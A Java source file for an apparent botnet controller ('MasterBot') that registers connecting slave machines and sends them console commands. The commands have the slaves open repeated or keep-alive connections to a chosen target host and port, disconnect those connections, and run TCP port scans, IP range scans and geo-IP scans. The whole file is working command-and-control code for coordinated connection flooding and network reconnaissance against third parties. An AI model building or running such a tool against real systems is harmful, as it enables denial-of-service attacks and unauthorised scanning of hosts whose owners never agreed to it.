import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.concurrent.ThreadLocalRandom;;

public class MasterBot extends Thread {

	// class variables
	private ServerSocket serverSocket;
	static String trgtAddr, hSlave, nodscn;
	static String url = "";

	static int noOfSlavesConnected, targetPort, noOfConnections = 1;
	static boolean keepAlive = false;
	static ArrayList<Socket> lstSlaveSock = new ArrayList<>();
	private int port;
	private String ip;
	static SlaveBot slaveBot = new SlaveBot();
	static HashMap<String, ArrayList<Socket>> tempMapSLVMaster = new HashMap<String, ArrayList<Socket>>();

	public MasterBot() {
	}

	public MasterBot(int port) throws IOException {
		serverSocket = new ServerSocket(port);
	}

	public MasterBot(int port, String ip) throws IOException {
		this.port = port;
		this.ip = ip;
	}

	public void run() {
		noOfSlavesConnected = 0;
		int slaveCount = 0;
		BufferedWriter output = null;
		String text = "";
		try {
			File file = new File("slave_data.txt");
			output = new BufferedWriter(new FileWriter(file));
			Date date = new Date();
			text = "SlaveHostName\t\tIPAddress\tSourcePortNumber\tRegistrationDate";
			output.write(text);

			while (true) {
				slaveCount++;
				Socket slaveSocket = new Socket();
				slaveSocket = serverSocket.accept();
				lstSlaveSock.add(slaveSocket);
				noOfSlavesConnected++;
				output.newLine();
				text = "" + slaveSocket.getRemoteSocketAddress() + "\t";
				output.write(text);
				text = "" + slaveSocket.getLocalAddress() + "\t";
				output.write(text);
				text = "\t" + serverSocket.getLocalPort() + "\t";
				output.write(text);
				text = "\t" + new SimpleDateFormat("yyyy-mm-dd").format(date);
				output.write(text);
				output.flush();
				System.out.println("Slave: " + slaveCount + " IP ADDRESS: " + slaveSocket.getRemoteSocketAddress()
						+ " PORT NUMBER: " + serverSocket.getLocalPort() + " RegistrationDate: "
						+ new SimpleDateFormat("yyyy-MM-dd").format(Calendar.getInstance().getTime()));
			}
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				serverSocket.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	public static void connect(String cmd) {

		cmd.trim();
		url = null;
		keepAlive = false;
		noOfConnections = 0;
		String[] arrayOfString = cmd.split("[ \t]+");
		hSlave = arrayOfString[1];
		String tempipAddOrHostNameOfSlave = "/" + hSlave;
		trgtAddr = arrayOfString[2];

		targetPort = Integer.parseInt(arrayOfString[3]);
		if (arrayOfString.length > 4 && !(cmd.contains("keepalive") || cmd.contains("keepAlive"))) {
			if (!arrayOfString[4].contains("url")) {
				noOfConnections = Integer.parseInt(arrayOfString[4]);
			}
		} else if (arrayOfString.length > 4) {
			if (arrayOfString[4].matches("^[1-9]\\d*$")) {
				noOfConnections = Integer.parseInt(arrayOfString[4]);
			}
		}
		if (arrayOfString.length > 5 && cmd.contains("keepalive") || cmd.contains("keepAlive")) {
			keepAlive = true;
		}
		if (cmd.contains("url")) {
			String temp = cmd.substring(cmd.lastIndexOf("url") + 4);
			url = temp;
		}
		if (hSlave.equalsIgnoreCase("all")) {
			for (int k = 0; k < lstSlaveSock.size(); k++) {
				tempMapSLVMaster = slaveBot.connectRemoteH(targetPort, trgtAddr, lstSlaveSock.get(k), noOfConnections,
						keepAlive, url);
			}
		} else {
			for (int k = 0; k < lstSlaveSock.size(); k++) {
				if (tempipAddOrHostNameOfSlave.equalsIgnoreCase(lstSlaveSock.get(k).getRemoteSocketAddress().toString())
						|| tempipAddOrHostNameOfSlave.equalsIgnoreCase(lstSlaveSock.get(k).getLocalAddress().toString())
						|| hSlave.equalsIgnoreCase(lstSlaveSock.get(k).getRemoteSocketAddress().toString())
						|| hSlave.equalsIgnoreCase(lstSlaveSock.get(k).getLocalAddress().toString())) {
					tempMapSLVMaster = slaveBot.connectRemoteH(targetPort, trgtAddr, lstSlaveSock.get(k),
							noOfConnections, keepAlive, url);
				}

			}

		}
	}

	public static void tcpportscan(String cmd) {
		String[] dataArray = cmd.split("\\s+");
		String portRange = null;
		String slaveIPAddress = "";
		String targetIPAddress = "";
		SlaveBot slave = new SlaveBot();

		if (noOfSlavesConnected == 0) {
			System.out.println("No Slaves connected to the server.\n");
		}
		// for invalid commands
		if (dataArray.length != 4) {
			System.out.println("Invalid Command \n");

		}
		// for valid commands
		if (dataArray.length == 4) {
			slaveIPAddress = dataArray[1];
			targetIPAddress = dataArray[2];
			portRange = dataArray[3];
			System.out.println("tcpportscan started in seperate thread");
		}

		if (slaveIPAddress.equalsIgnoreCase("all")) {
			for (int i = 0; i < lstSlaveSock.size(); i++) {
				slave.setCommand("tcpportscan");
				
				slave.setIp(lstSlaveSock.get(i).getInetAddress().getHostAddress());
				slave.setTargetIP(targetIPAddress);
				Thread t1 = new Thread(slave);
				t1.start();
			}
		} else {

			slave.setCommand("tcpportscan");
			slave.setIp(slaveIPAddress);
			slave.setTargetIP(targetIPAddress);
			slave.setPortRange(portRange);
			Thread t1 = new Thread(slave);
			t1.start();

		}
	}

	public static void geoIpScan(String cmd) {
		cmd.trim();
		String[] arrayOfString = cmd.split("[ \t]+");
		hSlave = arrayOfString[1];
		String ipRange = arrayOfString[2];
		System.out.println("IP Range" + ipRange);
		SlaveBot slave = new SlaveBot();
		String range = arrayOfString[2];
		if (hSlave.equalsIgnoreCase("all")) {
			for (int i = 0; i < lstSlaveSock.size(); i++) {
				slave.setCommand("geoipscan");
				slave.setRange(ipRange);
				slave.setIp(lstSlaveSock.get(i).getInetAddress().getHostAddress());
				Thread t1 = new Thread(slave);
				t1.start();

			}
		} else {
			slave.setCommand("geoipscan");
			slave.setRange(ipRange);
			slave.setIp(hSlave);
			Thread t1 = new Thread(slave);
			t1.start();
		}

	}

	public static void ipScan(String cmd) {

		cmd.trim();
		String[] arrayOfString = cmd.split("[ \t]+");
		hSlave = arrayOfString[1];
		System.out.println("hslave" + hSlave);
		String ipRange = arrayOfString[2];
		SlaveBot slave = new SlaveBot();
		String range = arrayOfString[2];
		if (hSlave.equalsIgnoreCase("all")) {
			System.out.println("All");
			for (int i = 0; i < lstSlaveSock.size(); i++) {
				slave.setCommand("ipscan");
				slave.setRange(ipRange);
				slave.setIp(lstSlaveSock.get(i).getInetAddress().getHostAddress());
				Thread t1 = new Thread(slave);
				t1.start();

			}
		} else {
			slave.setCommand("ipscan");
			slave.setRange(ipRange);
			slave.setIp(hSlave);
			Thread t1 = new Thread(slave);
			t1.start();
		}

	}

	public static void disConnect(String cmd) {
		cmd.trim();
		String temptargetPort = null;
		String[] arrayOfString = cmd.split("\\s+");
		hSlave = arrayOfString[1];
		String tempipAddOrHostNameOfSlave = "/" + hSlave;
		trgtAddr = arrayOfString[2];

		if (arrayOfString.length > 3)
			temptargetPort = arrayOfString[3];
		if (!temptargetPort.equalsIgnoreCase("all")) {
			targetPort = Integer.parseInt(temptargetPort);
		}

		if (!temptargetPort.equalsIgnoreCase("all")) {
			for (int k = 0; k < lstSlaveSock.size(); k++) {
				for (String key : tempMapSLVMaster.keySet()) {
					ArrayList<Socket> temp = tempMapSLVMaster.get(key);
					if (temp.size() != 0) {
						for (int i = 0; i < temp.size(); i++) {
							if (temp.get(i).getInetAddress().toString().contains(trgtAddr)) {
								if (temp.get(i).getPort() == targetPort) {
									slaveBot.disconnectRemote(temp.get(i));
									temp.remove(i);
								}

							}
						}
					}

				}
			}

		} else if (temptargetPort.equalsIgnoreCase("all")) {
			for (int k = 0; k < lstSlaveSock.size(); k++) {
				for (String key : tempMapSLVMaster.keySet()) {
					ArrayList<Socket> temp = tempMapSLVMaster.get(key);
					if (temp.size() != 0) {
						for (int i = 0; i < temp.size(); i++) {
							if (temp.get(i).getInetAddress().toString().contains(trgtAddr)) {
								if (temptargetPort != null) {
									slaveBot.disconnectRemote(temp.get(i));
									temp.remove(i);

								}
							}
						}
					}

				}
			}
		}
	}

	public static void main(String[] args) {
		String cmd;
		BufferedReader console = new BufferedReader(new InputStreamReader(System.in));
		int port = 0;
		if (args.length != 0) {
			port = Integer.parseInt(args[1]);
		}
		// input format example = "java MasterBot"
		else {
			System.out.println(" If port not given take 3000 as default port");
			port = 3000;
		}

		if (args.length != 2 || !args[0].equals("-p")) {
			System.out.println("MasterBot -p port#");
			System.exit(-1);
		}
		port = Integer.parseInt(args[1]);
		if (port != 0) {
			try {
				Thread t = new MasterBot(port);
				t.start();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		while (true) {
			try {
				System.out.print(">");
				cmd = console.readLine();
				if (cmd.equals(""))
					continue;
				if (cmd.endsWith("list")) {
					BufferedReader br = null;
					String sCurrentLine;
					br = new BufferedReader(new FileReader("slave_data.txt"));
					while ((sCurrentLine = br.readLine()) != null) {
						System.out.println(sCurrentLine);
					}
				}
				if (cmd.startsWith("connect")) {
					connect(cmd);
					continue;
				}
				if (cmd.startsWith("disconnect")) {
					disConnect(cmd);
					continue;
				}

				if (cmd.startsWith("tcpportscan")) {
					if (noOfSlavesConnected == 0) {
						System.out.println("No Slaves are currently connected to the server.\n");
						continue;
					}
					tcpportscan(cmd);
					continue;
				}
				if (cmd.startsWith("ipscan")) {
					if (noOfSlavesConnected == 0) {
						System.out.println("No Slaves are currently connected to the server.\n");
						continue;
					}
					ipScan(cmd);
					continue;
				}
				if (cmd.startsWith("geoipscan")) {
					if (noOfSlavesConnected == 0) {
						System.out.println("No Slaves are currently connected to the server.\n");
						continue;
					}
					geoIpScan(cmd);
				}

			} catch (Exception e) {
				System.out.println("-1");
			}
		}
	}

	public int getPort() {
		return port;
	}

	public void setPort(int port) {
		this.port = port;
	}

	public String getIp() {
		return ip;
	}

	public void setIp(String ip) {
		this.ip = ip;
	}

}